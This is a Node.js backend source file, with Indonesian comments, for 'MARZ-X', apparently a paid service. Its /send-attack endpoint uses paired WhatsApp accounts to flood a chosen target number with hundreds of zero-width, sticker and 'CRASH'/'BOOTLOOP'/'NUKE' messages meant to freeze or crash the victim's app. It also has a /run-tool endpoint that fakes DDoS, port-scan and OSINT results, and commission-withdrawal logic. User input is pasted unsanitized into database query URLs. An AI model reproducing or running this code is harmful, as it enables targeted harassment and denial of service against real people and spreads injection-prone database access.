// ================================================================
// MARZ-X BACKEND — LENGKAP (Bug, Tools, Sender, Withdraw)
// ================================================================
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const { Client, LocalAuth, MessageMedia } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');

const app = express();
app.use(cors());
app.use(express.json());

// ================================================================
// KONFIGURASI SUPABASE
// ================================================================
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;
if (!SUPABASE_URL || !SUPABASE_KEY) {
  console.error('❌ SUPABASE_URL dan SUPABASE_KEY wajib diisi di .env');
  process.exit(1);
}

const supabaseHeaders = {
  'apikey': SUPABASE_KEY,
  'Authorization': 'Bearer ' + SUPABASE_KEY,
  'Content-Type': 'application/json'
};

// ================================================================
// WHATSAPP CLIENT MANAGER (Multi-akun sender)
// ================================================================
const clients = {};

async function getWhatsAppClient(senderNumber) {
  if (clients[senderNumber]) return clients[senderNumber];

  const client = new Client({
    authStrategy: new LocalAuth({ clientId: senderNumber }),
    puppeteer: {
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    }
  });

  client.on('qr', (qr) => {
    console.log(`📱 QR Code untuk ${senderNumber}:`);
    qrcode.generate(qr, { small: true });
  });

  client.on('ready', () => {
    console.log(`✅ Bot ${senderNumber} siap!`);
    updateSenderStatus(senderNumber, 'active');
  });

  client.on('auth_failure', () => {
    console.log(`❌ Auth gagal untuk ${senderNumber}`);
    updateSenderStatus(senderNumber, 'inactive');
  });

  client.on('disconnected', (reason) => {
    console.log(`⚠️ Bot ${senderNumber} terputus: ${reason}`);
    updateSenderStatus(senderNumber, 'inactive');
    delete clients[senderNumber];
  });

  await client.initialize();
  clients[senderNumber] = client;
  return client;
}

async function updateSenderStatus(senderNumber, status) {
  try {
    await axios.patch(
      `${SUPABASE_URL}/rest/v1/whatsapp_senders?phone_number=eq.${senderNumber}`,
      { status, last_pairing: new Date().toISOString() },
      { headers: supabaseHeaders }
    );
  } catch (e) {
    console.error('Gagal update status sender:', e.message);
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ================================================================
// ENDPOINT: SEND ATTACK (WHATSAPP BUG)
// ================================================================
app.post('/send-attack', async (req, res) => {
  const { sender, target, bug, username } = req.body;
  if (!sender || !target || !bug) {
    return res.status(400).json({ success: false, message: 'Data tidak lengkap (sender, target, bug)' });
  }

  try {
    const client = await getWhatsAppClient(sender);
    const chatId = target.includes('@c.us') ? target : target + '@c.us';
    console.log(`🔥 [${username}] Serangan ${bug} dari ${sender} ke ${target}`);

    switch (bug) {
      case 'DELAY HARD':
        await client.sendMessage(chatId, '⚠️ DELAY HARD — File 100MB dikirim...');
        for (let i = 0; i < 3; i++) {
          try {
            const media = await MessageMedia.fromUrl('https://example.com/large-file.jpg');
            await client.sendMessage(chatId, media, { caption: `File ${i+1} dari 3 (100MB)` });
          } catch (e) {
            await client.sendMessage(chatId, `📁 File ${i+1} (simulasi 100MB)`);
          }
          await delay(3000);
        }
        await client.sendMessage(chatId, '✅ DELAY HARD selesai.');
        break;

      case 'BLANK HARD':
        for (let i = 0; i < 300; i++) {
          await client.sendMessage(chatId, '\u200B');
          if (i % 50 === 0) await delay(1000);
        }
        break;

      case 'FREEZE HARD':
        for (let i = 0; i < 150; i++) {
          try {
            const sticker = await MessageMedia.fromUrl('https://example.com/sticker.webp');
            await client.sendMessage(chatId, sticker, { sendMediaAsSticker: true });
          } catch (e) {
            await client.sendMessage(chatId, `🎨 Sticker ${i+1}`);
          }
          if (i % 20 === 0) await delay(1000);
        }
        break;

      case 'FC INSTANT':
        const glitch = '[*_*]'.repeat(100);
        await client.sendMessage(chatId, glitch);
        for (let i = 0; i < 50; i++) {
          await client.sendMessage(chatId, `⚠️ CRASH ${i+1}`);
          await delay(100);
        }
        break;

      case 'RESTART HARD':
        await client.sendMessage(chatId, '🔄 RESTART HARD dimulai...');
        for (let i = 0; i < 100; i++) {
          await client.sendMessage(chatId, `🔄 Restart ${i+1}`);
          await delay(200);
        }
        break;

      case 'BOOTLOOP HARD':
        for (let i = 0; i < 500; i++) {
          await client.sendMessage(chatId, `🌀 BOOTLOOP ${i+1}`);
          if (i % 100 === 0) await delay(1000);
        }
        break;

      case 'NUKE':
        await client.sendMessage(chatId, '☢️ NUKE DIMULAI — Kombinasi total!');
        for (let i = 0; i < 100; i++) {
          await client.sendMessage(chatId, '\u200B');
          await delay(50);
        }
        for (let i = 0; i < 50; i++) {
          try {
            const sticker = await MessageMedia.fromUrl('https://example.com/sticker.webp');
            await client.sendMessage(chatId, sticker, { sendMediaAsSticker: true });
          } catch (e) {
            await client.sendMessage(chatId, `🎨 Sticker ${i+1}`);
          }
          await delay(200);
        }
        for (let i = 0; i < 100; i++) {
          await client.sendMessage(chatId, `💥 NUKE ${i+1}`);
          await delay(100);
        }
        break;

      default:
        return res.status(400).json({ success: false, message: 'Jenis bug tidak dikenal' });
    }

    res.json({ success: true, message: `Serangan ${bug} dikirim ke ${target} dari ${sender}` });

  } catch (error) {
    console.error('Error send-attack:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ================================================================
// ENDPOINT: RUN TOOL
// ================================================================
app.post('/run-tool', async (req, res) => {
  const { tool, target, username } = req.body;
  if (!tool || !target) {
    return res.status(400).json({ success: false, message: 'Data tidak lengkap (tool, target)' });
  }

  console.log(`🛠️ [${username}] Menjalankan tool ${tool} ke ${target}`);
  let result = '';

  switch (tool) {
    case 'DDOS ATTACK':
      result = `🌐 DDOS Attack simulated to ${target}. Packet flood started.`;
      break;
    case 'OSINT LOOKUP':
      result = `🔍 OSINT Lookup on ${target}:\n- IP: 192.168.1.${Math.floor(Math.random()*255)}\n- Provider: Telkomsel\n- Lokasi: Jakarta, ID`;
      break;
    case 'ADMIN FINDER':
      result = `📂 Admin Finder on ${target}:\n- /admin\n- /login\n- /dashboard\n- /wp-admin`;
      break;
    case 'REVERSE IP':
      result = `🔄 Reverse IP on ${target}:\n- domain1.com\n- domain2.net\n- mail.${target}`;
      break;
    case 'PORT SCANNER':
      result = `🔌 Port Scanner on ${target}:\n- Port 22 (SSH): OPEN\n- Port 80 (HTTP): OPEN\n- Port 443 (HTTPS): OPEN\n- Port 3306 (MySQL): CLOSED`;
      break;
    case 'WEB SCRAPER':
      result = `🕸️ Web Scraper on ${target}:\n- Title: Example Domain\n- Links found: 12\n- Images: 8`;
      break;
    default:
      return res.status(400).json({ success: false, message: 'Tool tidak dikenal' });
  }

  res.json({ success: true, result });
});

// ================================================================
// ENDPOINT: SENDER STATUS
// ================================================================
app.get('/sender-status/:username', async (req, res) => {
  const { username } = req.params;
  try {
    const response = await axios.get(
      `${SUPABASE_URL}/rest/v1/whatsapp_senders?username=eq.${username}&select=*`,
      { headers: supabaseHeaders }
    );
    res.json(response.data[0] || null);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================================================================
// ENDPOINT: SENDER PAIR
// ================================================================
app.post('/sender-pair', async (req, res) => {
  const { username, phoneNumber, method } = req.body;
  if (!username || !phoneNumber) {
    return res.status(400).json({ success: false, message: 'Username dan phoneNumber wajib diisi' });
  }

  try {
    const existing = await axios.get(
      `${SUPABASE_URL}/rest/v1/whatsapp_senders?username=eq.${username}`,
      { headers: supabaseHeaders }
    );

    if (existing.data && existing.data.length > 0) {
      await axios.patch(
        `${SUPABASE_URL}/rest/v1/whatsapp_senders?username=eq.${username}`,
        {
          phone_number: phoneNumber,
          method: method || 'pairing',
          status: 'pending',
          last_pairing: new Date().toISOString()
        },
        { headers: supabaseHeaders }
      );
    } else {
      await axios.post(
        `${SUPABASE_URL}/rest/v1/whatsapp_senders`,
        {
          username,
          phone_number: phoneNumber,
          method: method || 'pairing',
          status: 'pending',
          last_pairing: new Date().toISOString()
        },
        { headers: supabaseHeaders }
      );
    }

    const code = Math.random().toString(36).substring(2, 10).toUpperCase();
    await getWhatsAppClient(phoneNumber);

    res.json({
      success: true,
      code,
      message: 'Sender tersimpan. Scan QR atau masukkan kode pairing di WhatsApp.'
    });

  } catch (error) {
    console.error('Error pairing:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ================================================================
// ENDPOINT: CEK SALDO KOMISI
// ================================================================
app.get('/commission-balance/:username', async (req, res) => {
  const { username } = req.params;
  try {
    const response = await axios.get(
      `${SUPABASE_URL}/rest/v1/users?username=eq.${username}&select=commission_balance,total_commission`,
      { headers: supabaseHeaders }
    );
    if (response.data && response.data.length > 0) {
      res.json({
        commission_balance: response.data[0].commission_balance || 0,
        total_commission: response.data[0].total_commission || 0
      });
    } else {
      res.status(404).json({ error: 'User tidak ditemukan' });
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ================================================================
// ENDPOINT: PENARIKAN SALDO (WITHDRAW)
// ================================================================
app.post('/withdraw', async (req, res) => {
  const { username, amount, method, bankName, accountNumber, accountName } = req.body;

  // Validasi input
  if (!username || !amount || amount < 50000) {
    return res.status(400).json({
      success: false,
      message: 'Username dan nominal minimal Rp 50.000 wajib diisi.'
    });
  }

  try {
    // 1. Ambil saldo komisi user
    const userResp = await axios.get(
      `${SUPABASE_URL}/rest/v1/users?username=eq.${username}&select=commission_balance`,
      { headers: supabaseHeaders }
    );
    if (!userResp.data || userResp.data.length === 0) {
      return res.status(404).json({ success: false, message: 'User tidak ditemukan' });
    }
    const currentBalance = userResp.data[0].commission_balance || 0;

    if (currentBalance < amount) {
      return res.status(400).json({
        success: false,
        message: `Saldo tidak mencukupi. Saldo Anda: Rp ${currentBalance.toLocaleString()}`
      });
    }

    // 2. Insert ke tabel withdrawals dengan status PENDING
    const withdrawResp = await axios.post(
      `${SUPABASE_URL}/rest/v1/withdrawals`,
      {
        user_id: username,
        amount: amount,
        status: 'PENDING',
        bank_name: bankName || null,
        account_number: accountNumber || null,
        account_name: accountName || null,
        created_at: new Date().toISOString()
      },
      { headers: supabaseHeaders }
    );

    // 3. Kurangi commission_balance user
    await axios.patch(
      `${SUPABASE_URL}/rest/v1/users?username=eq.${username}`,
      {
        commission_balance: currentBalance - amount
      },
      { headers: supabaseHeaders }
    );

    res.json({
      success: true,
      message: 'Permintaan penarikan berhasil diajukan. Menunggu verifikasi.',
      withdrawal_id: withdrawResp.data[0]?.id || null
    });

  } catch (error) {
    console.error('Error withdraw:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ================================================================
// ENDPOINT: HEALTH CHECK
// ================================================================
app.get('/', (req, res) => {
  res.json({
    status: '🚀 MARZ-X Backend running',
    endpoints: {
      '/send-attack': 'POST - Kirim serangan bug',
      '/run-tool': 'POST - Jalankan tools',
      '/sender-status/:username': 'GET - Cek status sender',
      '/sender-pair': 'POST - Pairing sender',
      '/commission-balance/:username': 'GET - Cek saldo komisi',
      '/withdraw': 'POST - Ajukan penarikan saldo (min 50k)'
    }
  });
});

// ================================================================
// START SERVER
// ================================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 MARZ-X Backend running on port ${PORT}`);
});
